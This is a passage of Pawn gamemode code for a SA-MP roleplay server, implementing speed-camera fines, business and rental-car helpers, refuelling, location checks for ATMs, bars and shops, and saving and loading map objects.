	RadarInfo[r][rCreado] = 1;
	RadarInfo[r][tX] = fx;
	RadarInfo[r][tY] = fy;
	RadarInfo[r][tZ] = fz;
	RadarInfo[r][tRX] = frx;
	RadarInfo[r][tRY] = fry;
	RadarInfo[r][tRZ] = frz;
	RadarInfo[r][rRadio] = fradio;
	RadarInfo[r][rVelMax] = fvelmax;
	format(string, sizeof(string), "{007AFF}[HIZ RADARI]\n{00FF00}Maximum Hýz: {FFFFFF}%d{00FF00} MP/H", fvelmax);
	Create3DTextLabel(string,0xFFFFFFF7,fx,fy,fz +7,100,0,0);
	return 1;
}

forward FotoMultaON();
public FotoMultaON()
{
	for(new i; i< MAX_RADAR; i++){
	    if(RadarInfo[i][rCreado]){
			for(new d,e=GetMaxPlayers(); d<e; d++){
				if(IsPlayerConnected(d) && IsPlayerInRangeOfPoint(d,RadarInfo[i][rRadio],RadarInfo[i][tX],RadarInfo[i][tY],RadarInfo[i][tZ]) && IsPlayerInAnyVehicle(d)){
					if(SacarVelocidad(d) > RadarInfo[i][rVelMax] && !LimiteSuperado[d]){
					    LimitedeVelocidadpa(d, RadarInfo[i][rVelMax], SacarVelocidad(d));
					    LimiteSuperado[d] = 1;
					}
					else if(SacarVelocidad(d) < RadarInfo[i][rVelMax] && LimiteSuperado[d]){
					    LimiteSuperado[d] = 0;
					}
				}
			}
		}
	}
	return 1;
}

forward LimitedeVelocidadpa(playerid, velmax, velactual);
public LimitedeVelocidadpa(playerid, velmax, velactual)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && PlayerInfo[playerid][pFaction] == 0 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDuty] == 0 || PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pFaction] == 9)
	{
		TextDrawShowForPlayer(playerid, Foto);
		SetTimerEx("TiempoFoto", 6000, false, "i", playerid);
		SetTimerEx("QuitarCamara", 600, false, "i", playerid);
		PlayerInfo[playerid][pBank] -= 100;
        SendClientMessage(playerid, COLOR_YELLOW, "Department: Hýz limitini aþarak hýz radarýndan geçtiðiniz tespit edilmiþtir.-> Ceza 100 $");
	}
	return 1;
}

forward TiempoFoto(playerid);
public TiempoFoto(playerid)
{
    LimiteSuperado[playerid] = 0;
    return 1;
}
forward QuitarCamara(playerid);
public QuitarCamara(playerid)
{
    TextDrawHideForPlayer(playerid,Foto);
    return 1;
}

stock SacarVelocidad(playerid)
{
	new Float:vX, Float:vY, Float:vZ, Float:Velocidad;
	GetVehicleVelocity(GetPlayerVehicleID(playerid), vX, vY, vZ);
	Velocidad = floatmul(floatsqroot(floatadd(floatadd(floatpower(vX, 2), floatpower(vY, 2)),  floatpower(vZ, 2))), 100.0);
	return floatround(floatdiv(Velocidad, 0.75), floatround_floor);
}

stock IsPlayerTied(playerid)
{
	if(!PlayerTied[playerid]) return 0;
	if(PlayerTied[playerid]) return 1;
	return 1;
}

stock SendAdminMessage(color, admlvl, string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] && PlayerInfo[i][pAdmin] >= admlvl)
		{
		    SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock RBS(bizid)
{
	new string[16];
	if(!BizInfo[bizid][bStatus]) format(string, sizeof(string), "Kapali");
    else if(BizInfo[bizid][bStatus]) format(string, sizeof(string), "Acik");
	return string;
}
/*
stock EngelOlustur(playerid, Float: posX, Float: posY, Float: posZ, obje)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, MAX_PLAYER_NAME);
	for(new i; i < MAX_ENGEL; ++i)
	{
	    if(EngelInfo[i][bVar] == 1) continue;
	    EngelInfo[i][bVar] = 1;
	    EngelInfo[i][bX] = posX+1.0;
		EngelInfo[i][bY] = posY+1.0;
		EngelInfo[i][bZ] = posZ-0.7;
		EngelInfo[i][bModel] = obje;
		EngelInfo[i][bObje] = CreateDynamicObject(obje, posX, posY, posZ, 0.0, 0.0, 0.0);
		ObjeKurdu(playerid);
		Streamer_Update(playerid);
		format(EngelInfo[i][bText], 80, "| ID: %d | Sahip: %s", i, name);
		EngelInfo[i][b3D] = Create3DTextLabel(EngelInfo[i][bText],0x4BB600FF, posX, posY, posZ, 8.0, 0, 0);
		SetPVarInt(playerid, "EngelID", i);
		// IpucuMesajiYolla(playerid,"Obje düzenlerken kaydet butonuna basmadýðýnýzda oluþan hatalarda teknik destek verilmeyecektir.");
		EditDynamicObject(playerid, EngelInfo[i][bObje]);
		break;
	}
	return 1;
}

stock EngelSil(id)
{
	EngelInfo[id][bVar] = 0;
	EngelInfo[id][bX] = 0.0;
	EngelInfo[id][bY] = 0.0;
	EngelInfo[id][bZ] = 0.0;
	EngelInfo[id][bModel] = 0;
	format(EngelInfo[id][bText], 80, "Engel");
	DestroyDynamicObject(EngelInfo[id][bObje]);
	Delete3DTextLabel(EngelInfo[id][b3D]);
	return 1;
}
*/
stock RPNU(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}

stock ObjeKurdu(playerid)
{
	new Float: x, Float: y, Float: z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(playerid,x+0.1,y,z);
}
stock RPBP(playerid)
{
	new string[32];
	if(!PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "Yok");
	else if(PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "%d", BizInfo[PlayerInfo[playerid][pBiz]][bProducts]);
	return string;
}

stock RPBM(playerid)
{
	new string[32];
	if(!PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "None");
	else if(PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "%d $", BizInfo[PlayerInfo[playerid][pBiz]][bMoney]);
	return string;
}
stock RPBS(playerid)
{
	new idx = PlayerInfo[playerid][pBiz];
	return BizInfo[idx][bSold];
}
stock RPBL(playerid)
{
	new string[32], idx = PlayerInfo[playerid][pBiz];
	if(!PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "Yok");
	else if(PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "%d", BizInfo[idx][bLevel]);
	return string;
}
stock RBT(bizid)
{
	new string[24];
	if(!BizInfo[bizid][bType]) format(string, sizeof(string), "Yok");
    else if(BizInfo[bizid][bType] == 1) format(string, sizeof(string), "24/7 Market");
    else if(BizInfo[bizid][bType] == 2) format(string, sizeof(string), "Giyisi Magazasi");
    else if(BizInfo[bizid][bType] == 3) format(string, sizeof(string), "Silahci");
    else if(BizInfo[bizid][bType] == 4) format(string, sizeof(string), "Club");
    else if(BizInfo[bizid][bType] == 5) format(string, sizeof(string), "Reklamcilik Sirketi");
    else if(BizInfo[bizid][bType] == 6) format(string, sizeof(string), "Fast Food");
    else if(BizInfo[bizid][bType] == 7) format(string, sizeof(string), "Elektronikçi");
	return string;
}
stock RPdonatorBL(playerid)
{
	new string[32], idx = PlayerInfo[playerid][pVBiz];
	if(!PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "%d", BizInfo[idx][bLevel]);
	return string;
}

stock RPdonatorBM(playerid)
{
	new string[32];
	if(!PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "%d $", BizInfo[PlayerInfo[playerid][pVBiz]][bMoney]);
	return string;
}
stock RPBK(playerid)
{
	new string[8];
	if(!PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "0");
	else if(PlayerInfo[playerid][pBiz]) format(string, sizeof(string), "%d", PlayerInfo[playerid][pBiz]);
	return string;
}
stock RPdonatorBK(playerid)
{
	new string[8];
	if(!PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "0");
	else if(PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "%d", PlayerInfo[playerid][pVBiz]);
	return string;
}
stock RPdonatorBP(playerid)
{
	new string[32];
	if(!PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(PlayerInfo[playerid][pVBiz]) format(string, sizeof(string), "%d", BizInfo[PlayerInfo[playerid][pVBiz]][bProducts]);
	return string;
}
stock IsABicycle(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 481,509,510: return 1;
	}
	return 0;
}

stock IsRentableCar(vehicleid)
{
    for(new i=0; i<10; i++)
    {
        if(vehicleid == RentableCar[i]) return 1;
    }
    return 0;
}

stock RPN(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid,name,sizeof(name));
    for(new i = 0; i < MAX_PLAYER_NAME; i++)
    {
        if(name[i] == '_') name[i] = ' ';
    }
    return name;
}
stock SendNearbyMessage(playerid, Float:radius, string[], col1, col2, col3, col4, col5)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	new Float:ix, Float:iy, Float:iz;
	new Float:cx, Float:cy, Float:cz;
	foreach(Player, i)
	{
/*	    if(IsPlayerLoggedIn(i))
	    {*/
	        if(GetPlayerInterior(playerid) == GetPlayerInterior(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
	        {
				GetPlayerPos(i, ix, iy, iz);
				cx = (x - ix);
				cy = (y - iy);
				cz = (z - iz);
				if(((cx < radius/16) && (cx > -radius/16)) && ((cy < radius/16) && (cy > -radius/16)) && ((cz < radius/16) && (cz > -radius/16)))
				{
				    SendClientMessage(i, col1, string);
				}
				else if(((cx < radius/8) && (cx > -radius/8)) && ((cy < radius/8) && (cy > -radius/8)) && ((cz < radius/8) && (cz > -radius/8)))
				{
				    SendClientMessage(i, col2, string);
				}
				else if(((cx < radius/4) && (cx > -radius/4)) && ((cy < radius/4) && (cy > -radius/4)) && ((cz < radius/4) && (cz > -radius/4)))
				{
				    SendClientMessage(i, col3, string);
				}
				else if(((cx < radius/2) && (cx > -radius/2)) && ((cy < radius/2) && (cy > -radius/2)) && ((cz < radius/2) && (cz > -radius/2)))
				{
				    SendClientMessage(i, col4, string);
				}
				else if(((cx < radius) && (cx > -radius)) && ((cy < radius) && (cy > -radius)) && ((cz < radius) && (cz > -radius)))
				{
				    SendClientMessage(i, col5, string);
				}
			}
	    //}
	}
	return 1;
}
stock CreateRentalVehicle(iModel, Float:fX, Float:fY, Float:fZ, Float:fAngle, iCol1, iCol2)
{
	new
		TMP;

	TMP = AddStaticVehicle(iModel, Float:fX, Float:fY, Float:fZ, Float:fAngle, iCol1, iCol2);

	SetVehicleNumberPlate(TMP, "R125 SDF");
	SetVehicleToRespawn(TMP);

	IsRentable[TMP] = 1;
	IsRented[TMP] = 0;
	RentedBy[TMP] = "No-one";
	return TMP;
}
stock CanAffordRental(playerid)
{
	new
		Money1;
	Money1 = GetPlayerMoney(playerid);
	if (Money1 >= RENT_COST){
	    return 1;
	}
	return 0;
}
stock IsRentedCar(vehicleid)
{
	if (IsRented[vehicleid])
		return 1;
	return 0;
}


stock GetPlayerSpeed(playerid, bool:mph = true)
{
	new
		Float:xx,
		Float:yy,
		Float:zz,
		Float:pSpeed;

	if(IsPlayerInAnyVehicle(playerid))
	{
		GetVehicleVelocity(GetPlayerVehicleID(playerid),xx,yy,zz);
	}
	else
	{
		GetPlayerVelocity(playerid,xx,yy,zz);
	}

	pSpeed = floatsqroot((xx * xx) + (yy * yy) + (zz * zz));
	return mph ? floatround((pSpeed * 165.12)) : floatround((pSpeed * 103.9));
}

stock ToggleEngine(vehicleid, toggle)
{
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vehicleid, toggle, lights, alarm, doors, bonnet, boot, objective);
}

stock GetVehicleSpeed(vehicleid, get3d)
{
	new Float:x, Float:y, Float:z;
	GetVehicleVelocity(vehicleid, x, y, z);
	return SpeedCheck(x, y, z, 100.0, get3d);
}

stock ModifyVehicleSpeed(vehicleid,mph)
{
	new Float:Vx,Float:Vy,Float:Vz,Float:DV,Float:multiple;
	GetVehicleVelocity(vehicleid,Vx,Vy,Vz);
	DV = floatsqroot(Vx*Vx + Vy*Vy + Vz*Vz);
	if(DV > 0)
	{
		multiple = ((mph + DV * 100) / (DV * 100));
		return SetVehicleVelocity(vehicleid,Vx*multiple,Vy*multiple,Vz*multiple);
	}
	return 0;
}

forward ReFill(playerid, vehicleslot);
public ReFill(playerid, vehicleslot)
{
    if(!GazIstasyonunda(playerid) || !IsPlayerInAnyVehicle(playerid) || Fuel[GetPlayerVehicleID(playerid)] >= 100.0 || GetPlayerCash(playerid) < 1)
	{
		StopRefueling(playerid, vehicleslot);
	}
	else
	{
		GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		if(engine == VEHICLE_PARAMS_ON) {
			StopRefueling(playerid, vehicleslot);
		}
		else {
			Fuel[GetPlayerVehicleID(playerid)] += 1.0;
			RefuelingVehiclePrice[playerid] += FUEL_PRICE;
			if(Fuel[GetPlayerVehicleID(playerid)] >= 100.0) Fuel[GetPlayerVehicleID(playerid)] = 100.0;
		}
	}
	return true;
}

stock GazIstasyonunda(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,10,1595.5406, 2198.0520, 10.3863) || IsPlayerInRangeOfPoint(playerid,10,2202.0649, 2472.6697, 10.5677) ||
	IsPlayerInRangeOfPoint(playerid,10,2115.1929, 919.9908, 10.5266) || IsPlayerInRangeOfPoint(playerid,10,2640.7209, 1105.9565, 10.5274) ||
	IsPlayerInRangeOfPoint(playerid,10,608.5971, 1699.6238, 6.9922) || IsPlayerInRangeOfPoint(playerid,10,618.4878, 1684.5792, 6.9922) ||
	IsPlayerInRangeOfPoint(playerid,10,2146.3467, 2748.2893, 10.5245) || IsPlayerInRangeOfPoint(playerid,10,-1679.4595, 412.5129, 6.9973) ||
	IsPlayerInRangeOfPoint(playerid,10,-1327.5607, 2677.4316, 49.8093) || IsPlayerInRangeOfPoint(playerid,10,-1470.0050, 1863.2375, 32.3521) ||
	IsPlayerInRangeOfPoint(playerid,10,-2409.2200, 976.2798, 45.2969) || IsPlayerInRangeOfPoint(playerid,10,-2244.1396, -2560.5833, 31.9219) ||
	IsPlayerInRangeOfPoint(playerid,10,-1606.0544, -2714.3083, 48.5335) || IsPlayerInRangeOfPoint(playerid,10,1937.4293, -1773.1865, 13.3828) ||
	IsPlayerInRangeOfPoint(playerid,10,-91.3854, -1169.9175, 2.4213) || IsPlayerInRangeOfPoint(playerid,10,1383.4221, 462.5385, 20.1506) ||
	IsPlayerInRangeOfPoint(playerid,10,660.4590, -565.0394, 16.3359) || IsPlayerInRangeOfPoint(playerid,10,1381.7206, 459.1907, 20.3452) ||
	IsPlayerInRangeOfPoint(playerid,10,-1605.7156, -2714.4573, 48.5335) || IsPlayerInRangeOfPoint(playerid,20,1882.2546,-2393.9824,16.5144) ||
	IsPlayerInRangeOfPoint(playerid,10,1386.5360,-271.5511,-0.4857) || IsPlayerInRangeOfPoint(playerid,10,2017.3016,-229.9219,-0.2183) ||
	IsPlayerInRangeOfPoint(playerid,10,1908.76,-1866.64,13.56) || IsPlayerInRangeOfPoint(playerid,10,1908.05,-1861.27,13.56) ||
	IsPlayerInRangeOfPoint(playerid,10,279.1325,1940.4025,17.6406) || IsPlayerInRangeOfPoint(playerid,10,-2324.0815,2362.8477,4.9922))
	{ return true; }
	return false;
}

stock StopRefueling(playerid, vehicleslot)
{
	GivePlayerCash(playerid, -RefuelingVehiclePrice[playerid]);

	new string[128];
	format(string, sizeof(string), "Aracýnýzýn benzin deposu %d TL'ye dolduruldu.", RefuelingVehiclePrice[playerid]);
	SendClientMessageEx(playerid, COLOR_WHITE,string);

	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(strcmp(Points[i][Name], "Fossil Fuel Company", true) == 0)
		{
			mypoint = i;
		}
	}
	for(new i = 0; i < sizeof(FamilyInfo); i++)
	{
		if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
		{
			FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(RefuelingVehiclePrice[playerid]/5);
		}
	}
	if(vehicleslot != -1) {
	    PlayerVehicleInfo[playerid][vehicleslot][pvFuel] = Fuel[PlayerVehicleInfo[playerid][vehicleslot][pvId]];
	}
	isrefuelling[playerid] = 0;
 	RefuelingVehiclePrice[playerid] = 0;
 	KillTimer(RefuelingVehicleTimer[playerid]);
	return true;
}


forward respawn(playerid);
public respawn(playerid)
{
	for(new i=0; i<MAX_VEHICLES; i++)
	{
		if(!Aractakiler(i))
	 	{
	  		SetVehicleToRespawn(i);
	    }
	}
	new string[128];
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		format(string, sizeof(string), "(( {FF6347}Level %d Admin %s: {FFFFFF}Kullanýlmayan araçlar respawn edilmiþtir! ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid));
		SendClientMessageToAllEx(COLOR_OOC,string);
 	}
	return 1;

}

forward Aractakiler(vehicleid);
public Aractakiler(vehicleid)
{
    for(new i=0;i<MAX_PLAYERS;i++)
    {
        if(IsPlayerInVehicle(i,vehicleid))
        return 1;
    }
    return 0;
}
/*
forward Objebitti(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz);
public Objebitti(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	if(PlayerInfo[playerid][eDuzenliyor] == 1)
	{
	 	new id = GetPVarInt(playerid, "EngelID");
	    EngelInfo[id][bX] = x;
		EngelInfo[id][bY] = y;
		EngelInfo[id][bZ] = z;
		SetDynamicObjectPos(objectid, x, y, z);
		SetDynamicObjectRot(objectid, rx,ry,rz);
		Delete3DTextLabel(EngelInfo[id][b3D]);
		EngelInfo[id][b3D] = Create3DTextLabel(EngelInfo[id][bText], 0x4BB600FF, x, y, z, 8.0, 0, 0);
		PlayerInfo[playerid][eDuzenliyor] = 0;
	}
	return 1;
}
*/
stock PlayerPlayMusic(playerid)
{
	if(IsPlayerConnected(playerid)) {
		SetTimer("StopMusic", 5000, 0);
		PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
	}
}

forward StopMusic();
public StopMusic()
{
	foreach(Player, i)
	{
		PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
	}
}

stock PlayerFixRadio(playerid)
{
	if(IsPlayerConnected(playerid)) {
		SetTimer("PlayerFixRadio2", 1000, 0);
		PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
		Fixr[playerid] = 1;
	}
}

forward PlayerFixRadio2();
public PlayerFixRadio2()
{
	foreach(Player, i)
	{
		if(Fixr[i])
		{
			PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
			Fixr[i] = 0;
		}
	}
}

stock vehicle_lock_doors(vehicle) {

	new
		vParamArr[7];

	GetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], vParamArr[3], vParamArr[4], vParamArr[5], vParamArr[6]);
	return SetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], VEHICLE_PARAMS_ON, vParamArr[4], vParamArr[5], vParamArr[6]);
}

stock vehicle_unlock_doors(vehicle) {

	new
		vParamArr[7];

	GetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], vParamArr[3], vParamArr[4], vParamArr[5], vParamArr[6]);
	return SetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], VEHICLE_PARAMS_OFF, vParamArr[4], vParamArr[5], vParamArr[6]);
}

stock IsSeatAvailable(vehicleid, seat)
{
	new carmodel = GetVehicleModel(vehicleid);
	for (new i = 0; i < sizeof(OneSeatVehicles); i++)
	{
	    if(carmodel == OneSeatVehicles[i]) return 0;
	}
	foreach(Player, i)
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == seat) return 0;
	}
	return 1;
}

stock IsPlayerInInvalidNosVehicle(playerid)
{
	switch(GetVehicleModel(GetPlayerVehicleID(playerid))) {
		case 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449: return 1;
	}
	return 0;
}

stock IsAtFishPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,1.0,403.8266,-2088.7598,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,398.7553,-2088.7490,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,396.2197,-2088.6692,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,391.1094,-2088.7976,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,383.4157,-2088.7849,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,374.9598,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,369.8107,-2088.7927,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,367.3637,-2088.7925,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,362.2244,-2088.7981,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,354.5382,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
	}
	return 0;
}

stock IsAtClothShop(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,25.0,207.5627,-103.7291,1005.2578) || IsPlayerInRangeOfPoint(playerid,25.0,203.9068,-41.0728,1001.8047) || IsPlayerInRangeOfPoint(playerid,25.0,203.9068,-41.0728,1001.8047))
		{//Binco & Suburban
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,30.0,214.4470,-7.6471,1001.2109) || IsPlayerInRangeOfPoint(playerid,50.0,161.3765,-83.8416,1001.8047))
		{//Zip & Victim
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,30.0,206.9438,-129.5811,1003.5078) || IsPlayerInRangeOfPoint(playerid,50.0,161.3765,-83.8416,1001.8047))
		{//Zip & Victim
			return 1;
		}		
		else if(IsPlayerInRangeOfPoint(playerid,5.0,202.6777,-163.0623,1000.5306))
		{//Diedier Sachs
		    return 1;
		}
	}
	return 0;
}

stock IsAtBar(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,3.0,495.7801,-76.0305,998.7578) || IsPlayerInRangeOfPoint(playerid,3.0,499.9654,-20.2515,1000.6797) || IsPlayerInRangeOfPoint(playerid,9.0,1497.5735,-1811.6150,825.3397))
		{//In grove street bar (with girlfriend), and in Havanna
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1215.9480,-13.3519,1000.9219) || IsPlayerInRangeOfPoint(playerid,10.0,-2658.9749,1407.4136,906.2734) || IsPlayerInRangeOfPoint(playerid,10.0,2155.3367,-97.3984,3.8308))
		{//PIG Pen
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,6.0,300.351287, 1030.323120, 1104.560058) || IsPlayerInRangeOfPoint(playerid,6.0,311.184661, 1011.819274, 1098.540039) || IsPlayerInRangeOfPoint(playerid,10.0,-1091.006958, 607.855773, 1116.507812))
		{// First two: Tableau Club - Last one: The Lubu Gentlemen's club
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,6.0,255.606887, 1086.537109, 5099.806152))
		{// Santa Maria Surfer's Lounge.
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,10.0,453.2437,-105.4000,999.5500) || IsPlayerInRangeOfPoint(playerid,10.0,1255.69, -791.76, 1085.38) ||
		IsPlayerInRangeOfPoint(playerid,10.0,2561.94, -1296.44, 1062.04) || IsPlayerInRangeOfPoint(playerid,10.0,1139.72, -3.96, 1000.67) ||
		IsPlayerInRangeOfPoint(playerid,10.0,1139.72, -3.96, 1000.67) || IsPlayerInRangeOfPoint(playerid, 10.0, 880.06, 1430.86, -82.34) ||
		IsPlayerInRangeOfPoint(playerid,10.0,499.96, -20.66, 1000.68))
		{
			//Bars
			return 1;
		}
	}
	return 0;
}

stock IsAtATM(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,3.0,2065.439453125, -1897.5510253906, 13.19670009613) || IsPlayerInRangeOfPoint(playerid,3.0,1497.7467041016, -1749.8747558594, 15.088212013245) || IsPlayerInRangeOfPoint(playerid,3.0,2093.5124511719, -1359.5474853516, 23.62727355957) || IsPlayerInRangeOfPoint(playerid,3.0,1155.6235351563, -1464.9141845703, 15.44321346283))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2139.4487304688, -1164.0811767578, 23.63508605957) || IsPlayerInRangeOfPoint(playerid,3.0,387.16552734375, -1816.0512695313, 7.4834146499634))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,-24.385023117065, -92.001075744629, 1003.1897583008) || IsPlayerInRangeOfPoint(playerid,3.0,-31.811220169067, -58.106018066406, 1003.1897583008) || IsPlayerInRangeOfPoint(playerid,3.0,1212.7785644531, 2.451762676239, 1000.5647583008) || IsPlayerInRangeOfPoint(playerid,3.0,2324.4028320313, -1644.9445800781, 14.469946861267))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2228.39, -1707.78, 13.25) || IsPlayerInRangeOfPoint(playerid,3.0,651.19305419922, -520.48815917969, 15.978837013245) || IsPlayerInRangeOfPoint(playerid, 3.0, 45.78035736084, -291.80926513672, 1.5024013519287) || IsPlayerInRangeOfPoint(playerid,3.0,1275.7958984375, 368.31481933594, 19.19758605957) || IsPlayerInRangeOfPoint(playerid,3.0,2303.4577636719, -13.539554595947, 26.12727355957))/*End of Red County Random ATM's*/
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,691.08215332031, -618.5625, 15.978837013245) || IsPlayerInRangeOfPoint(playerid,3.0,173.23471069336, -155.07606506348, 1.2210245132446) || IsPlayerInRangeOfPoint(playerid,3.0,1260.8796386719, 209.30152893066, 19.19758605957) || IsPlayerInRangeOfPoint(playerid,3.0,2316.1015625, -88.522567749023, 26.12727355957))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2052.9246, -1660.6346, 13.1300) || IsPlayerInRangeOfPoint(playerid,3.0,-1980.6300,121.5300,27.3100))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,-2453.7600,754.8200,34.8000) || IsPlayerInRangeOfPoint(playerid,3.0,-2678.6201,-283.3400,6.8000))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,5.0,519.8157,-2890.8601,4.4609))
		{
		    return 1;
		}
		else if((IsPlayerInRangeOfPoint(playerid,5.0,487.060546, -2383.360107, 10.782341) && GetPlayerInterior(playerid) == 18))
		{ // Saints Mall
		    return 1;
		}
	}
	return 0;
}

// Anti Dialog ID spoofing
stock ShowPlayerDialogEx(playerid, dialogid, style, caption[], info[], button1[], button2[]) {
	SetPVarInt(playerid, "dialog", dialogid);
	ShowPlayerDialog(playerid, dialogid, style, caption, info, button1, button2);
	return 1;
}
stock SaveObjects()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_OBJ)
	{
	    format(string, sizeof(string), "	CreateDynamicObject(%d,%f,%f,%f,%f,%f,%f);\r\n",
        ObjInfo[idx][oModel],
        ObjInfo[idx][oX],
        ObjInfo[idx][oY],
        ObjInfo[idx][oZ],
        ObjInfo[idx][oRX],
        ObjInfo[idx][oRY],
        ObjInfo[idx][oRZ]);
        if(idx == 1)
	    {
	        file = fopen("objects.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("objects.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Objects saved successfully.");
	return 1;
}
stock LoadCsObjects()
{
	new dinfo[15][128];
	new string[256];
	new File:file = fopen("objects22.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_OBJ)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
			ObjInfo[idx][oModel] = strval(dinfo[0]);
			ObjInfo[idx][oX] = floatstr(dinfo[1]);
			ObjInfo[idx][oY] = floatstr(dinfo[2]);
			ObjInfo[idx][oZ] = floatstr(dinfo[3]);
			ObjInfo[idx][oRX] = floatstr(dinfo[4]);
			ObjInfo[idx][oRY] = floatstr(dinfo[5]);
			ObjInfo[idx][oRZ] = floatstr(dinfo[6]);
			if(ObjInfo[idx][oModel]) // If gate exists
			{
				ObjInfo[idx][obj] = CreateDynamicObject(ObjInfo[idx][oModel], ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ], ObjInfo[idx][oRX], ObjInfo[idx][oRY], ObjInfo[idx][oRZ]);
                format(string, sizeof(string), "", idx, ObjInfo[idx][oModel]);
				ObjInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ], 10);
			}
			idx++;
	    }
	}
	print("Objeler haritaya iþleniyor...");
	return 1;
}
stock SaveObjects22()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_OBJ)
	{
	    format(string, sizeof(string), "	CreateDynamicObject(%d,%f,%f,%f,%f,%f,%f);\r\n",
        ObjInfo[idx][oModel],
        ObjInfo[idx][oX],
        ObjInfo[idx][oY],
        ObjInfo[idx][oZ],
        ObjInfo[idx][oRX],
        ObjInfo[idx][oRY],
